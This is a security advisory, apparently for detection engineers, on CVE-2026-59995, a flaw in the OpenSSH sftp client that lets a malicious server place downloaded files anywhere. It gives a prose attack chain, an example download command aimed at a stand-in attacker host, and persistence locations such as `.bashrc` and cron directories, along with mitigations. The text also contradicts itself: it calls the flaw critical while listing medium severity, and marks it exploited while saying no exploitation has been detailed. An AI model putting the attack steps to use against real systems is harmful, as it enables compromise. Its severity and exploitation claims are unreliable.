---
title: 'CVE-2026-59995: OpenSSH SFTP Arbitrary File Placement Vulnerability'
slug: 2026-07-openssh-sftp-arbitrary-file-placement
description: CVE-2026-59995 describes a vulnerability in the OpenSSH sftp client, specifically versions before 10.4, that allows an attacker to control the location of downloaded files when a user executes 'sftp server:/path .' against an attacker-controlled server, potentially leading to arbitrary file placement and subsequent system compromise.
date: "2026-07-09T07:41:03Z"
type: threat
types:
  - threat
severities:
  - medium
exploited: true
tags:
  - vulnerability
  - client-side
  - arbitrary-file-placement
  - openssh
  - sftp
vendors:
  - OpenSSH
products:
  - OpenSSH sftp < 10.4
cves:
  - id: CVE-2026-59995
    cvss: 4.2
references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-59995
---

A critical vulnerability, CVE-2026-59995, has been identified in the OpenSSH SFTP client, affecting all versions prior to 10.4. This flaw allows a malicious SFTP server to manipulate the client's file placement logic when a user executes the command `sftp server:/path .`. The vulnerability stems from insufficient constraints on the target location during file downloads, enabling the attacker-controlled server to dictate where files are saved on the victim's system. This could lead to malicious files being written to sensitive directories, potentially establishing persistence, achieving arbitrary code execution, or causing denial of service. While specific exploitation in the wild has not been detailed, the vulnerability poses a significant risk to users who interact with untrusted SFTP servers. This brief highlights the mechanics of the vulnerability and recommended mitigations for detection engineers.

## Attack Chain

1. An attacker provisions a malicious SFTP server specifically configured to exploit CVE-2026-59995.
2. The attacker crafts a lure, such as a deceptive communication or a malicious link, to entice a victim into connecting to their SFTP server.
3. The victim user, unaware of the server's malicious intent, executes the `sftp attacker.com:/remote/path .` command using a vulnerable OpenSSH client (version before 10.4).
4. During the download process, the malicious SFTP server responds with specially crafted directory listings or manipulated path information to the client.
5. Due to the parsing vulnerability (CVE-2026-59995), the OpenSSH client misinterprets the server's response regarding the intended download location.
6. The client then proceeds to write the downloaded files to an arbitrary, attacker-controlled location on the victim's local filesystem, outside of the current working directory.
7. The attacker places malicious executable binaries, scripts, or configuration files (e.g., within startup directories, user profile scripts, or system-critical locations).
8. Upon a subsequent system reboot, user login, or specific application execution, the arbitrarily placed malicious file is triggered, leading to persistence, privilege escalation, or arbitrary code execution on the victim's system.

## Impact

The impact of successful exploitation of CVE-2026-59995 can range from denial of service to full system compromise. If an attacker can place malicious executables in startup folders, user profile scripts (like `.bashrc`, `.profile`), or other auto-execution paths, they can achieve persistence and potentially arbitrary code execution with the user's privileges. Placement of corrupted or critical configuration files could lead to system instability or denial of service. While the vulnerability requires user interaction to connect to a malicious server, the ability to bypass intended download locations poses a significant security risk, allowing attackers to bypass standard download protections and system integrity checks.

## Recommendation

* Prioritize patching OpenSSH clients to version 10.4 or later immediately to mitigate CVE-2026-59995.
* Educate users about the risks of connecting to untrusted SFTP servers and executing download commands against them.
* Implement monitoring for unusual file writes to system-critical or user-profile directories, especially those typically used for persistence (e.g., startup folders, `/etc/cron.d`, `.bashrc`, `.profile`).
